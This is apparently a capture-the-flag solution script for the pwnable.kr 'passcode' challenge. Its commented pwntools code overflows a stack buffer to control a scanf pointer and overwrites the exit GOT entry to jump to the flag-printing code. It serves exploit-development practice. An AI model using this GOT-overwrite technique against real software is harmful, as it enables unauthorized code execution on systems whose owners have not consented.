from pwn import *

session = ssh('passcode', 'pwnable.kr', port=2222, password='guest')
session.download_file('~/passcode')
challenge_binary = ELF('passcode')

# The "win" basic block within the login function that prints the flag.
target_address = challenge_binary.functions['login'].address + 115

io = session.process('./passcode')

# The buffer in welcome() is 100 bytes. The last 4 bytes in the buffer
# will be our pointer passed to scanf() in the login function. Need
# 96 bytes of padding.
io.send('A' * 96)

# Since we control the pointer in the first scanf() call in login(), that
# gives us a write 4 primative. No PIE, partial RELRO, and system ASLR mean
# we're hijacking a pointer in the plt. Since the passcode failure path
# eventually calls exit@plt, that seems like a perfect entry to overwrite.
io.sendline(p32(challenge_binary.got['exit']))

# The next part of our input will be consumed by the scanf() that we control
# the pointer to. This is the value we want to write in the got.
io.sendline(str(target_address))

# We don't control the pointer for the second scanf() call, so we Ctrl+D
# around this to prevent a crash. The pointer value actually comes from
# welcome()'s stack canary and is random and will likely cause a crash.
io.send("\x04")

# If the exploit was successful, we should see Login OK just before the
# flag gets printed.
io.recvuntil('Login OK!\n')
print(io.recvline())
